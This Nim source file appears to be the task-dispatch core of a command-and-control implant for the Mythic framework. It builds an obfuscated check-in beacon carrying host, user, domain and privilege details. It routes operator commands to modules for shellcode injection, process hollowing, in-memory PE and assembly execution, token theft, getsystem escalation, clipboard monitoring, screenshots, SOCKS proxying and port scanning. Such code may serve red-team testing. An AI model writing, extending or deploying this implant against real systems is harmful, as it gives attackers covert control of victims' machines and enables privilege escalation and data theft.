## Task processing utilities for reuse in profiles
## This module provides functions to execute tasks and build responses
## This is the single source of truth for task execution logic

import std/[json, strutils]
import ../config
import ../global_data
import ../utils/debug
import ../utils/strenc
import ../utils/m_responses
import ../utils/sysinfo

# Import all task modules
import ../tasks/exit
import ../tasks/sleep
import ../tasks/ls
import ../tasks/download
import ../tasks/upload
import ../tasks/run
import ../tasks/whoami
import ../tasks/cat
import ../tasks/mkdir
import ../tasks/cp
import ../tasks/mv
import ../tasks/cd
import ../tasks/ps
import ../tasks/pwd
import ../tasks/rm
import ../tasks/pty
import ../tasks/socks
import ../tasks/rpfwd
import ../tasks/redirect
import ../tasks/getenv as taskGetenv
import ../tasks/connect

when defined(windows):
  import ../tasks/link

import ../tasks/portscan
import ../tasks/ifconfig
import ../tasks/netstat
import ../tasks/config as taskConfig
import ../tasks/pkill

when defined(windows):
  import ../tasks/execute_assembly
  import ../tasks/inline_execute
  import ../tasks/powerpick
  import ../tasks/shinject
  import ../tasks/make_token
  import ../tasks/steal_token
  import ../tasks/rev2self
  import ../tasks/runas
  import ../tasks/getsystem
  import ../tasks/getprivs
  import ../tasks/listpipes
  import ../tasks/scshell
  import ../tasks/spawnto_x64
  import ../tasks/spawnto_x86
  import ../tasks/ppid
  import ../tasks/reg_query
  import ../tasks/reg_write_value
  import ../tasks/net_dclist
  import ../tasks/net_localgroup
  import ../tasks/net_localgroup_member
  import ../tasks/net_shares
  import ../tasks/screenshot
  import ../tasks/get_av
  import ../tasks/clipboard
  import ../tasks/clipboard_monitor
  import ../tasks/donut
  import ../tasks/inject_hollow
  import ../tasks/run_pe

type
  TaskExecutionResult* = object
    response*: JsonNode
    needsBackgroundTracking*: bool  # True if caller should track as background task
    shouldExit*: bool  # True if this was an exit command

proc buildCheckinInfo*(): JsonNode =
  ## Build checkin information that can be reused for initial checkin or P2P checkin
  let sysInfo = getSystemInfo()
  let cfg = getConfig()
  
  result = %*{
    obf("action"): obf("checkin"),
    obf("uuid"): cfg.uuid,
    obf("ips"): sysInfo.ips,
    obf("os"): sysInfo.os,
    obf("user"): sysInfo.user,
    obf("host"): sysInfo.hostname,
    obf("pid"): sysInfo.pid,
    obf("architecture"): sysInfo.arch,
    obf("domain"): sysInfo.domain,
    obf("integrity_level"): sysInfo.integrityLevel,
    obf("process_name"): sysInfo.processName,
    obf("cwd"): sysInfo.cwd,
    obf("impersonation_context"): nil
  }

proc executeTask*(taskId: string, command: string, params: JsonNode): TaskExecutionResult =
  ## Execute a single task and return the response
  ## This can be called from any profile (HTTP, TCP, etc.) or from agent.nim
  ## Returns a TaskExecutionResult indicating if background tracking is needed
  debug "[DEBUG] === PROCESSING TASK ==="
  debug "[DEBUG] Task ID: " & taskId
  debug "[DEBUG] Command: " & command
  if params.len > 0:
    debug "[DEBUG] Parameters: " & params.pretty()
  else:
    debug "[DEBUG] No parameters"
  
  # Initialize result
  result.needsBackgroundTracking = false
  result.shouldExit = false
  
  # Default error response
  result.response = %*{
    obf("task_id"): taskId,
    obf("user_output"): "Command '" & command & "' not yet implemented",
    obf("completed"): true,
    obf("status"): "error"
  }
  
  try:
    case command
    of obf("exit"):
      debug "[DEBUG] Executing exit command"
      result.response = executeExit(params)
      result.response[obf("task_id")] = %taskId
      result.shouldExit = true
      
    of obf("sleep"):
      debug "[DEBUG] Executing sleep command"
      # Sleep modifies global config, but we need to pass current values
      # For now, just acknowledge - real implementation needs access to agent state
      result.response = %*{
        obf("task_id"): taskId,
        obf("user_output"): obf("Sleep updated"),
        obf("completed"): true,
        obf("status"): obf("success")
      }
      
    of obf("ls"):
      debug "[DEBUG] Executing ls command"
      let lsResult = executeLs(params)
      if lsResult.hasKey(obf("files")):
        result.response = %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): obf("completed"),
          obf("file_browser"): lsResult,
          obf("user_output"): $lsResult
        }
        debug "[DEBUG] Ls found " & $lsResult["files"].len & " files"
      else:
        result.response = lsResult
        result.response[obf("task_id")] = %taskId
        debug "[DEBUG] Ls returned error: " & result.response["user_output"].getStr()
    
    of obf("download"):
      debug "[DEBUG] Starting download"
      result.response = executeDownload(taskId, params)
      result.needsBackgroundTracking = true
    
    of obf("upload"):
      debug "[DEBUG] Starting upload"
      result.response = executeUpload(taskId, params)
      result.needsBackgroundTracking = true
    
    of obf("execute_assembly"):
      when defined(windows):
        debug "[DEBUG] Starting execute-assembly (file download)"
        result.response = executeAssembly(taskId, params)
        result.needsBackgroundTracking = true
      else:
        result.response = %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("execute_assembly command is only available on Windows")
        }
    
    of obf("inline_execute"):
      when defined(windows):
        debug "[DEBUG] Starting inline_execute (BOF download)"
        result.response = inlineExecute(taskId, params)
        result.needsBackgroundTracking = true
      else:
        result.response = %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("inline_execute command is only available on Windows")
        }
    
    of obf("shinject"):
      when defined(windows):
        debug "[DEBUG] Starting shinject (shellcode download)"
        result.response = shinject(taskId, params)
        result.needsBackgroundTracking = true
      else:
        result.response = %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("shinject command is only available on Windows")
        }
    
    of obf("donut"):
      when defined(windows):
        debug "[DEBUG] Starting donut (file download)"
        result.response = donut(taskId, params)
        result.needsBackgroundTracking = true
      else:
        result.response = %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("donut command is only available on Windows")
        }
    
    of obf("inject_hollow"):
      when defined(windows):
        debug "[DEBUG] Starting inject_hollow (file download)"
        result.response = injectHollow(taskId, params)
        result.needsBackgroundTracking = true
      else:
        result.response = %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("inject_hollow command is only available on Windows")
        }
    
    of obf("run"), obf("shell"):
      debug "[DEBUG] Executing run/shell command"
      result.response = run(taskId, params)
      result.response[obf("task_id")] = %taskId
    
    of obf("powerpick"):
      when defined(windows):
        debug "[DEBUG] Executing powerpick command"
        result.response = powerpick(taskId, params)
        result.response[obf("task_id")] = %taskId
      else:
        result.response = %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("powerpick command is only available on Windows")
        }
    
    of obf("whoami"):
      debug "[DEBUG] Executing whoami command"
      result.response = whoami(taskId, $params)
    
    of obf("cat"):
      debug "[DEBUG] Executing cat command"
      result.response = catFile(taskId, $params)
    
    of obf("mkdir"):
      debug "[DEBUG] Executing mkdir command"
      result.response = makeDirectory(taskId, $params)
    
    of obf("cp"):
      debug "[DEBUG] Executing cp command"
      result.response = cpFile(taskId, $params)
    
    of obf("mv"):
      debug "[DEBUG] Executing mv command"
      result.response = mvFile(taskId, $params)
    
    of obf("cd"):
      debug "[DEBUG] Executing cd command"
      result.response = changeDirectory(taskId, $params)
    
    of obf("ps"):
      debug "[DEBUG] Executing ps command"
      result.response = ps($params)
      result.response[obf("task_id")] = %taskId
    
    of obf("pwd"):
      debug "[DEBUG] Executing pwd command"
      result.response = pwd(taskId, params)
    
    of obf("rm"):
      debug "[DEBUG] Executing rm command"
      result.response = rm(taskId, params)
    
    of obf("pty"):
      debug "[DEBUG] Executing pty command"
      result.response = pty(taskId, params)
      # PTY sessions require background tracking in agent.nim
    
    of obf("socks"):
      debug "[DEBUG] Executing socks command"
      result.response = socks(taskId, params)
      # Socks requires background tracking in agent.nim
    
    of obf("rpfwd"):
      debug "[DEBUG] Executing rpfwd command"
      result.response = rpfwd(taskId, params)
      # Rpfwd requires background tracking in agent.nim
    
    of obf("connect"):
      debug "[DEBUG] Executing connect command"
      result.response = handleConnect(taskId, params)
      # Connect requires background tracking in agent.nim
      
    of obf("link"):
      when defined(windows):
        debug "[DEBUG] Executing link command"
        result.response = handleLink(taskId, params)
        # Link requires background tracking in agent.nim
      else:
        result.response = mythicError(taskId, "Link command is only supported on Windows")
    
    of obf("redirect"):
      debug "[DEBUG] Executing redirect command"
      result.response = redirect(taskId, params)
      # Redirect requires background tracking in agent.nim
    
    of obf("getenv"):
      debug "[DEBUG] Executing getenv command"
      result.response = taskGetenv.getenv(taskId, params)
    
    of obf("ifconfig"):
      debug "[DEBUG] Executing ifconfig command"
      result.response = ifconfig(taskId, params)
    
    of obf("netstat"):
      debug "[DEBUG] Executing netstat command"
      result.response = netstat(taskId, params)
    
    of obf("config"):
      debug "[DEBUG] Executing config command"
      result.response = taskConfig.config(taskId, params)
    
    of obf("pkill"):
      debug "[DEBUG] Executing pkill command"
      result.response = pkill(taskId, params)
    
    of obf("portscan"):
      debug "[DEBUG] Starting portscan (background task)"
      result.response = portscan(taskId, params)
      # Portscan requires monitoring task tracking in agent.nim
    
    # Windows-specific commands
    of obf("make_token"):
      when defined(windows):
        debug "[DEBUG] Executing make_token command"
        result.response = makeToken(taskId, params)
      else:
        result.response = %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("make_token command is only available on Windows")
        }
    
    of obf("steal_token"):
      when defined(windows):
        debug "[DEBUG] Executing steal_token command"
        result.response = stealToken(taskId, params)
      else:
        result.response = %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("steal_token command is only available on Windows")
        }
    
    of obf("rev2self"):
      when defined(windows):
        debug "[DEBUG] Executing rev2self command"
        result.response = rev2self(taskId, params)
      else:
        result.response = %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("rev2self command is only available on Windows")
        }
    
    of obf("runas"):
      when defined(windows):
        debug "[DEBUG] Executing runas command"
        result.response = runas(taskId, params)
      else:
        result.response = %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("runas command is only available on Windows")
        }
    
    of obf("getsystem"):
      when defined(windows):
        debug "[DEBUG] Executing getsystem command"
        result.response = getsystem(taskId, params)
      else:
        result.response = %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("getsystem command is only available on Windows")
        }
    
    of obf("getprivs"):
      when defined(windows):
        debug "[DEBUG] Executing getprivs command"
        result.response = getprivs(taskId, params)
      else:
        result.response = %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("getprivs command is only available on Windows")
        }
    
    of obf("listpipes"):
      when defined(windows):
        debug "[DEBUG] Executing listpipes command"
        result.response = listpipes(taskId, params)
      else:
        result.response = %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("listpipes command is only available on Windows")
        }
    
    of obf("scshell"):
      when defined(windows):
        debug "[DEBUG] Executing scshell command"
        result.response = scshell(taskId, params)
      else:
        result.response = %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("scshell command is only available on Windows")
        }
    
    of obf("spawnto_x64"):
      when defined(windows):
        debug "[DEBUG] Executing spawnto_x64 command"
        result.response = spawnto_x64(taskId, params)
      else:
        result.response = %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("spawnto_x64 command is only available on Windows")
        }
    
    of obf("spawnto_x86"):
      when defined(windows):
        debug "[DEBUG] Executing spawnto_x86 command"
        result.response = spawnto_x86(taskId, params)
      else:
        result.response = %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("spawnto_x86 command is only available on Windows")
        }
    
    of obf("ppid"):
      when defined(windows):
        debug "[DEBUG] Executing ppid command"
        result.response = ppid(taskId, params)
      else:
        result.response = %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("ppid command is only available on Windows")
        }
    
    of obf("reg_query"):
      when defined(windows):
        debug "[DEBUG] Executing reg_query command"
        result.response = regQuery(taskId, params)
      else:
        result.response = %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("reg_query command is only available on Windows")
        }
    
    of obf("reg_write_value"):
      when defined(windows):
        debug "[DEBUG] Executing reg_write_value command"
        result.response = regWriteValue(taskId, params)
      else:
        result.response = %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("reg_write_value command is only available on Windows")
        }
    
    of obf("net_dclist"):
      when defined(windows):
        debug "[DEBUG] Executing net_dclist command"
        result.response = netDclist(taskId, params)
      else:
        result.response = %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("net_dclist command is only available on Windows")
        }
    
    of obf("net_localgroup"):
      when defined(windows):
        debug "[DEBUG] Executing net_localgroup command"
        result.response = netLocalgroup(taskId, params)
      else:
        result.response = %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("net_localgroup command is only available on Windows")
        }
    
    of obf("net_localgroup_member"):
      when defined(windows):
        debug "[DEBUG] Executing net_localgroup_member command"
        result.response = netLocalgroupMember(taskId, params)
      else:
        result.response = %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("net_localgroup_member command is only available on Windows")
        }
    
    of obf("net_shares"):
      when defined(windows):
        debug "[DEBUG] Executing net_shares command"
        result.response = netShares(taskId, params)
      else:
        result.response = %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("net_shares command is only available on Windows")
        }
    
    of obf("screenshot"):
      when defined(windows):
        debug "[DEBUG] Executing screenshot command"
        result.response = screenshot(taskId, params)
        result.needsBackgroundTracking = true
      else:
        result.response = %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("screenshot command is only available on Windows")
        }
    
    of obf("get_av"):
      when defined(windows):
        debug "[DEBUG] Executing get_av command"
        result.response = getAv(taskId, params)
      else:
        result.response = %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("get_av command is only available on Windows")
        }
    
    of obf("clipboard"):
      when defined(windows):
        debug "[DEBUG] Executing clipboard command"
        result.response = clipboard(taskId, params)
      else:
        result.response = %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("clipboard command is only available on Windows")
        }
    
    of obf("clipboard_monitor"):
      when defined(windows):
        debug "[DEBUG] Starting clipboard_monitor (monitoring task)"
        result.response = clipboardMonitor(taskId, params)
        # Clipboard monitor requires monitoring task tracking in agent.nim
      else:
        result.response = %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("clipboard_monitor command is only available on Windows")
        }
    
    of obf("run_pe"):
      when defined(windows):
        debug "[DEBUG] Starting run_pe (file download)"
        result.response = run_pe(taskId, params)
        result.needsBackgroundTracking = true
      else:
        result.response = %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("run_pe command is only available on Windows")
        }
    
    else:
      # Command not implemented
      debug "[DEBUG] Command not implemented: " & command
  
  except Exception as e:
    debug "[DEBUG] Task execution error: " & e.msg
    result.response = %*{
      obf("task_id"): taskId,
      obf("user_output"): "Error executing command: " & e.msg,
      obf("completed"): true,
      obf("status"): "error"
    }
    result.needsBackgroundTracking = false
  
  if result.response.hasKey(obf("status")):
    debug "[DEBUG] Task result status: ", result.response["status"].getStr()
  if result.response.hasKey(obf("user_output")):
    let output = result.response[obf("user_output")].getStr()
    if output.len < 200:
      debug "[DEBUG] Task output: ", output
    else:
      debug "[DEBUG] Task output length: ", output.len, " bytes"
